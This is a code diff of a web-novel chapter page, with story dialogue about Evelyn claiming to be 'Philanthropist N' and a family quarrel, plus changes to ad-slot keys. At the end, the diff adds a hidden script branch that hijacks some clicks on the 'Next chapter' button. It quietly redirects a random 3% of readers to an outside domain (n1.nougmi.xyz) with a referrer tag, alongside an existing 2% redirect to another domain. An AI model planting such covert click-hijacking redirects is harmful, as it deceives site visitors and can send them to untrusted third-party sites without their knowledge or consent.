@@ -2400,7 +2400,7 @@
                 <p>Cecilia couldn&#39;t help but sneer.</p>
                 <p>&#34;Miss Evelyn, just because Victoria is a philanthropist, you claim to be Philanthropist N? That&#39;s utterly ridiculous.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>&#34;Philanthropist N started doing charity work five years ago. What about you? I recall you only got divorced this year, didn&#39;t you?&#34;</p>
                 <p>Victoria also spoke calmly.</p>
                 <p>&#34;At various award ceremonies and charity galas, I don&#39;t believe I&#39;ve ever seen Miss Evelyn&#39;s presence.&#34;</p>
@@ -2415,7 +2415,7 @@
                 <p>&#34;Cousin, I just didn&#39;t want you to be wronged!&#34;</p>
                 <p>Evelyn was baffled.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
                 <p>Cecilia quickly chimed in.</p>
                 <p>&#34;Not wanting her to be wronged, so you lie in front of us? And boast about being Philanthropist N?&#34;</p>
                 <p>&#34;How could Philanthropist N possibly help a spy? After what she did, her reputation is already ruined!&#34;</p>
@@ -2430,7 +2430,7 @@
                 <p>Robert Vance, Alexander&#39;s father, immediately roared angrily.</p>
                 <p>&#34;You rebellious son! I think you just want to anger me to death!&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Alexander glanced at him indifferently.</p>
                 <p>&#34;Not at all. But if you insist on being unreasonable, I can&#39;t stop you.&#34;</p>
                 <p>&#34;You...!&#34;</p>
@@ -2445,7 +2445,7 @@
                 <p>&#34;Miss Evelyn, what are you laughing at? Do you think what I said is wrong?&#34;</p>
                 <p>&#34;Everyone is part of the Vance family. They all share the Vance name.&#34;</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>&#34;I believe Mrs. Eleanor Vance would also wish to see the main and second branches living in harmony, wouldn&#39;t she?&#34;</p>
                 <p>&#34;Do you think Mrs. Vance wants to see them in constant conflict?&#34;</p>
                 <p>Evelyn sneered.</p>
@@ -2460,7 +2460,7 @@
                 <p>&#34;My wife and I don&#39;t need others to teach us how to behave!&#34;</p>
                 <p>He then directly looked at the butler.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>&#34;See the guests out!&#34;</p>
                 <p>The butler immediately stepped beside Victoria.</p>
                 <p>Victoria&#39;s expression changed.</p>
@@ -2478,7 +2478,7 @@
                 <p>&#34;Didn&#39;t you just say it yourself? You&#39;re N. Do you think we&#39;d believe it? Unless you show proof!&#34;</p>
                 <p>&#34;Fine, I&#39;ll show you! Open your eyes wide and see clearly!&#34;</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
             </div>
             
             <div class="font-controls">
@@ -2600,7 +2600,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2616,8 +2616,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
